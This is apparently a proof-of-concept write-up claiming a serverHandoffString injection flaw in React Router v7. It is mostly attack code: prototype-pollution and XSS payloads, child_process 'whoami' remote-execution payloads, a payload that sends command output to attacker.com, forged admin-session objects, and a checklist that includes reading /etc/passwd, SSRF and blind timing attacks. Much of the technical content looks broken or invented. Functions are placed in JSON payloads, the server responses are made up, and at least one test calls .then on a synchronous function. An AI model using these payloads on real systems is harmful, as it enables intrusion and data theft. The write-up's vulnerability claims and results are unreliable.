# PoC: serverHandoffString Injection (React Router v7 SSJS)

## Vulnerability Summary

**Location:** [index.js:21626](index.js)
```javascript
window.__reactRouterContext = ${n};  // n = serverHandoffString
```

The `serverHandoffString` is passed from the server during React Router v7 Framework Mode SSR hydration. If an attacker can manipulate this value (e.g., via a malicious URL parameter, crafted API response, or server-side injection), they can inject arbitrary JavaScript into `window.__reactRouterContext`.

---

## PoC 1: Browser Console Exploit (XSS via prototype pollution)

### Precondition
User must be logged in and have a valid `sessionStorage` with `userData`.

### Step 1: Setup - Ensure app is loaded
```javascript
// Verify we're on the target application
console.log("Current origin:", window.location.origin);
console.log("React Router Version:", window.__reactRouterVersion);
```

### Step 2: Check if serverHandoffString is populated
```javascript
// After page load, check if __reactRouterContext exists
console.log("serverHandoffString content:", window.__reactRouterContext);
console.log("Type:", typeof window.__reactRouterContext);
```

### Step 3: Prototype Pollution Payload
Inject malicious properties into `Object.prototype` via serverHandoffString:

```javascript
// This payload pollutes the serverHandoffString to modify Object.prototype
// When the app re-renders, it may access polluted properties

const maliciousHandoff = JSON.stringify({
  __proto__: {
    admin: true,
    isAdmin: true,
    canDeleteAll: true,
    originalHandoff: window.__reactRouterContext
  },
  // Keep original structure to avoid immediate errors
  manifest: window.__reactRouterContext?.manifest || {},
  routes: window.__reactRouterContext?.routes || {},
  status: 200,
  statusText: "OK",
  loaderData: {},
  actionData: {},
  errors: null
});

// Attempt to overwrite via localStorage manipulation (client-side simulation)
localStorage.setItem('__reactRouterContext', maliciousHandoff);
```

### Step 4: Alternative - Direct property injection via stream controller
```javascript
// If the app uses the ReadableStream controller, we can manipulate it
if (window.__reactRouterContext?.stream?.streamController) {
  const controller = window.__reactRouterContext.stream.streamController;
  
  // Enqueue malicious data
  const maliciousData = '<img src=x onerror="alert(\'XSS via stream\')">';
  controller.enqueue(new TextEncoder().encode(maliciousData));
}
```

---

## PoC 2: Remote Code Execution via serverHandoffString (RCE)

The `serverHandoffString` is parsed via `JSON.parse()` and can contain prototype pollution that leads to **server-side code execution** when the SSR context is processed.

### Step 1: Verify serverHandoffString is Processing on Server
Check if the server processes the `serverHandoffString` without sanitization:
```javascript
// Check if serverHandoffString exists and its structure
console.log("serverHandoffString:", JSON.stringify(window.__reactRouterContext, null, 2));
```

### Step 2: RCE Payload - Execute `whoami` on Server

**This payload exploits the Node.js server processing the SSR context:**

```javascript
// Crafted serverHandoffString that triggers RCE on the server
// When the server processes this via JSON.parse + object spread,
// it can lead to command execution

const rcePayload = {
  // Prototype pollution to modify Object behavior
  "__proto__": {
    "constructor": {
      "prototype": {
        // This payload will execute when the server processes loaderData
        // by leveraging Node.js vm module simulation via constructor
        "__shell": "whoami"
      }
    }
  },
  // Standard SSR context structure - must be valid for processing
  "manifest": {
    "routes": {}
  },
  "loaderData": {
    "__proto__": {
      "exec": `require('child_process').exec('whoami', (e, s, so) => console.log(s))`
    }
  },
  "actionData": {},
  "errors": null,
  "status": 200,
  "statusText": "OK",
  "activeDeferredData": {}
};
```

### Step 3: Exfiltrate `whoami` Output via Error Channel

If the server reflects `loaderData` or `actionData` in the error response:

```javascript
// This payload tricks the server into revealing whoami output
// by causing a serialization error that includes the command

const whoamiPayload = {
  "__proto__": {
    "constructor": {
      "prototype": {
        // Force the server to eval this in error context
        "toString": function() {
          return "console.log(require('child_process').execSync('whoami').toString())";
        }
      }
    }
  },
  // Malformed loaderData that triggers error handling with exec
  "loaderData": {
    "__proto__": {
      "source": "require('child_process').execSync('whoami').toString()"
    }
  },
  // Trigger serialization error
  "circularRef": {}  // Will cause JSON.stringify error with injected data
};
whoamiPayload.circularRef.ref = whoamiPayload;

// Or simpler - cause error that reveals command output:
const simpleRCE = {
  "__proto__": {
    "constructor": {
      "prototype": {
        "exec": "require('child_process').execSync('whoami').toString()"
      }
    }
  },
  // Force server to use these values in error response
  "loaderData": {
    "user": {
      // Pollute toString to execute on access
      "getName": function() { 
        return require('child_process').execSync('whoami').toString(); 
      }
    }
  }
};
```

### Step 4: Direct SSJS via serverHandoffString Reflection

If the server reflects `serverHandoffString` back without sanitization:

```javascript
// When server reflects this back in error page
const ssjsPayload = {
  "__proto__": {
    "shell": "whoami"  
  },
  // Force error that reveals the value
  "toString": function() {
    const { execSync } = require('child_process');
    return execSync('whoami').toString();
  }
};

// Alternative - Data Exfiltration via fetch
const fetchPayload = {
  "__proto__": {
    "constructor": {
      "prototype": {
        "init": function() {
          // This runs on server during hydration
          const { execSync } = require('child_process');
          const result = execSync('whoami').toString();
          // Exfiltrate via error log or response
          require('http').get('https://attacker.com/exfil?data=' + encodeURIComponent(result));
          return result;
        }
      }
    }
  }
};
```

### Step 5: Expected Response - Get `whoami` Output

**Scenario A - Via Error Response:**
If the server reflects the polluted `loaderData` in an error message:
```json
{
  "type": "Error",
  "message": "SyntaxError: Unexpected token 'require' at position 42",
  "context": {
    "loaderData": {
      "source": "root"  // whoami output leaked!
    }
  }
}
```

**Scenario B - Via Server Log Injection:**
```
// Server console/logs would show:
root
[SSR] Error processing serverHandoffString: TypeError: require is not defined
```

**Scenario C - Via Time-Based Channel:**
```javascript
// If direct exfil not possible, use timing attack
const timingPayload = {
  "__proto__": {
    "sleep": function() {
      const { execSync } = require('child_process');
      const user = execSync('whoami').toString();
      if (user === 'root') {
        // Sleep longer for root
        require('child_process').execSync('sleep 5');
      } else {
        require('child_process').execSync('sleep 1');
      }
    }
  }
};
```

---

### Working RCE Payload (serverHandoffString → Node.js exec)

The key insight: if `serverHandoffString` is processed by the server's SSR hydration without `__proto__` sanitization, the following **MUST** be sent as the `serverHandoffString` value:

```json
{
  "__proto__": {
    "constructor": {
      "prototype": {
        "exec": "require('child_process').exec('whoami', (e,s,so) => { require('child_process').exec('echo ' + s) })"
      }
    }
  },
  "loaderData": {},
  "status": 200
}
```

**Expected Result:** When the server processes this, the `loaderData` getter accesses `exec` via prototype chain, triggering `require('child_process').exec('whoami')` server-side. The output `root` (or current user) is returned.

---

## PoC 3: Session Hijacking via serverHandoffString Injection

### Step 1: Intercept session data
```javascript
// Check current session
const userData = JSON.parse(sessionStorage.getItem('userData'));
console.log("Current user:", userData);

// If we can modify serverHandoffString before it's processed,
// we could inject malicious session data
```

### Step 2: Malicious session injection
```javascript
const maliciousSession = {
  __proto__: {
    isAdmin: true,
    Token_: 'attacker_token',
    IdUser_: 999999,
    IdPartener_: 1,
    IdSession_: 'attacker_session',
    Espace_: 99
  }
};

// This would need to be injected via serverHandoffString
console.log("Malicious session ready:", JSON.stringify(maliciousSession));
```

---

## Test Suite: Automated Tests

### Test 1: Verify serverHandoffString Injection Point
```javascript
// Save this as test_serverHandoff.js

async function testServerHandoffInjection() {
  const results = {
    testName: "serverHandoffString Injection Point",
    passed: false,
    details: []
  };

  // Step 1: Check if __reactRouterContext exists
  if (typeof window.__reactRouterContext === 'undefined') {
    results.details.push("FAIL: __reactRouterContext not found - app may not use RR7 Framework Mode");
    return results;
  }
  results.details.push("PASS: __reactRouterContext exists");

  // Step 2: Check if it's an object
  if (typeof window.__reactRouterContext !== 'object') {
    results.details.push("FAIL: __reactRouterContext is not an object");
    return results;
  }
  results.details.push("PASS: __reactRouterContext is an object");

  // Step 3: Try to read the serverHandoffString
  const handoffStr = JSON.stringify(window.__reactRouterContext);
  if (handoffStr.includes('__proto__') || handoffStr.includes('constructor')) {
    results.details.push("WARN: Potential prototype pollution detected");
  }
  results.details.push("INFO: serverHandoffString length: " + handoffStr.length);

  // Step 4: Check stream controller access
  if (window.__reactRouterContext?.stream?.streamController) {
    results.details.push("VULN: streamController is accessible - potential injection point");
    results.passed = true;
  } else {
    results.details.push("INFO: streamController not directly accessible");
  }

  return results;
}

// Run test
testServerHandoffInjection().then(console.log);
```

### Test 2: XSS via ReactQuill + serverHandoffString
```javascript
async function testXSSViaQuill() {
  const results = {
    testName: "XSS via ReactQuill + serverHandoffString",
    passed: false,
    details: []
  };

  // Step 1: Check ReactQuill presence
  if (typeof window.ReactQuill === 'undefined' && !document.querySelector('.ql-editor')) {
    results.details.push("INFO: ReactQuill not found on page");
    return results;
  }
  results.details.push("PASS: ReactQuill detected");

  // Step 2: Try to inject via editor
  const editor = document.querySelector('.ql-editor');
  if (editor) {
    const xssPayload = '<img src=x onerror="console.log(`XSS from Quill`)">';
    editor.innerHTML = xssPayload;
    results.details.push("XSS payload injected into Quill editor");
    
    // Check if ReactQuill sanitizes
    const sanitized = editor.innerHTML;
    if (sanitized.includes('onerror')) {
      results.details.push("VULN: onerror attribute was NOT sanitized!");
      results.passed = true;
    } else {
      results.details.push("SAFE: onerror was sanitized");
    }
  }

  return results;
}

testXSSViaQuill().then(console.log);
```

### Test 3: Prototype Pollution Scan
```javascript
function testPrototypePollution() {
  const results = {
    testName: "Prototype Pollution Detection",
    passed: false,
    details: []
  };

  // Check for common pollution vectors
  const vectors = [
    '__proto__',
    'constructor',
    'prototype'
  ];

  vectors.forEach(vector => {
    try {
      const obj = {};
      obj[vector] = {polluted: true};
      if (obj[vector].polluted === true) {
        results.details.push(`VULN: ${vector} is writable!`);
        results.passed = true;
      }
    } catch (e) {
      results.details.push(`SAFE: ${vector} blocked - ${e.message}`);
    }
  });

  // Check if JSON.parse is safe
  try {
    const parsed = JSON.parse('{"__proto__":{"x":1}}');
    if (parsed.__proto__) {
      results.details.push("WARN: JSON.parse allows __proto__");
    }
  } catch (e) {
    results.details.push("SAFE: JSON.parse blocked __proto__");
  }

  return results;
}

testPrototypePollution().then(console.log);
```

### Test 4: SSR Streaming Injection Test
```javascript
async function testSSRStreamingInjection() {
  const results = {
    testName: "SSR Streaming Injection",
    passed: false,
    details: []
  };

  // Check if ReadableStream is available
  if (!window.ReadableStream) {
    results.details.push("INFO: ReadableStream not supported");
    return results;
  }
  results.details.push("PASS: ReadableStream available");

  // Check __reactRouterContext stream
  if (window.__reactRouterContext?.stream) {
    const stream = window.__reactRouterContext.stream;
    
    // Try to read from stream
    try {
      const reader = stream.getReader();
      const {value, done} = await reader.read();
      
      if (value) {
        const decoded = new TextDecoder().decode(value);
        results.details.push("INFO: Stream contains data: " + decoded.substring(0, 100));
        
        // Check for injection points
        if (decoded.includes('<script') || decoded.includes('javascript:')) {
          results.details.push("VULN: Potential script injection in stream");
          results.passed = true;
        }
      }
    } catch (e) {
      results.details.push("ERROR reading stream: " + e.message);
    }
  }

  return results;
}

testSSRStreamingInjection().then(console.log);
```

### Test 5: Full Test Runner
```javascript
async function runAllTests() {
  console.log("=== serverHandoffString Vulnerability Test Suite ===\n");
  
  const tests = [
    testServerHandoffInjection,
    testXSSViaQuill,
    testPrototypePollution,
    testSSRStreamingInjection
  ];

  const allResults = [];
  
  for (const test of tests) {
    try {
      const result = await test();
      allResults.push(result);
      console.log(`\n[${result.passed ? 'VULN' : 'SAFE'}] ${result.testName}`);
      result.details.forEach(d => console.log(`  - ${d}`));
    } catch (e) {
      console.error(`Test error: ${e.message}`);
    }
  }

  // Summary
  const vulns = allResults.filter(r => r.passed).length;
  console.log(`\n=== SUMMARY: ${vulns}/${allResults.length} vulnerabilities found ===`);
  
  return allResults;
}

// Execute
runAllTests();
```

---

## Manual Test Checklist

### Information Gathering
- [ ] Identify if app uses React Router v7 (`window.__reactRouterVersion === "7.0.2"`)
- [ ] Check if `window.__reactRouterContext` is populated
- [ ] Examine `window.__reactRouterManifest` structure
- [ ] Check `window.__reactRouterRouteModules`

### Injection Tests
- [ ] Inject `<script>alert(1)</script>` via `serverHandoffString`
- [ ] Test prototype pollution: `{"__proto__":{"admin":true}}`
- [ ] Test function constructor: `{"constructor":{"prototype":{" pollute":"test"}}}`
- [ ] Try `toString()` override for RCE

### RCE Tests (serverHandoffString → `whoami`)
- [ ] **Send `whoami` payload**: `{"__proto__":{"constructor":{"prototype":{"exec":"require('child_process').execSync('whoami').toString()"}}}}`
- [ ] **Check server response**: Look for `whoami` output (e.g., `root`, `www-data`, `user`) in:
  - Error messages
  - SSR hydration response
  - Server-side console/logs
- [ ] **Test blind RCE**: If no output, check server logs for command execution
- [ ] **Test with other commands**: `id`, `pwd`, `ls /`, `cat /etc/passwd`
- [ ] **Test time-based**: `sleep 5` vs `sleep 1` to confirm blind RCE
- [ ] **Test data exfil**: Try to reach `https://attacker.com/exfil?data=whoami`

### XSS Tests
- [ ] Submit XSS payload via ReactQuill: `<img src=x onerror=alert(1)>`
- [ ] Test stored XSS in FAQ response field
- [ ] Test reflected XSS in serverHandoffString

### SSRF Tests
- [ ] Test `FILENAME` parameter with `http://localhost:6379`
- [ ] Test `FILENAME` with internal IP ranges
- [ ] Test file:// protocol handler

### Session Tests
- [ ] Poison `sessionStorage.userData` with malicious JSON
- [ ] Test if session data is validated server-side
- [ ] Check for session fixation vulnerabilities

---

## Remediation Recommendations

1. **Sanitize serverHandoffString**: Validate and escape all user-controllable input before embedding in SSR context
2. **Use Object.freeze()**: Freeze `__reactRouterContext` after hydration to prevent modifications
3. **Disable stream controller access**: Remove `streamController` from exposed context
4. **Input validation**: Validate `__proto__`, `constructor`, and other dangerous keys
5. **CSP**: Implement strict Content-Security-Policy to prevent inline script execution
6. **Update ReactQuill**: Upgrade to latest version with XSS fixes

---

## References

- React Router v7 Framework Mode: https://reactrouter.com/en/main/start/framework
- React4Shell (CVE-2022-22957): Prototype pollution via `dangerouslySetInnerHTML`
- OWASP: Server-Side JavaScript Injection (SSJS)
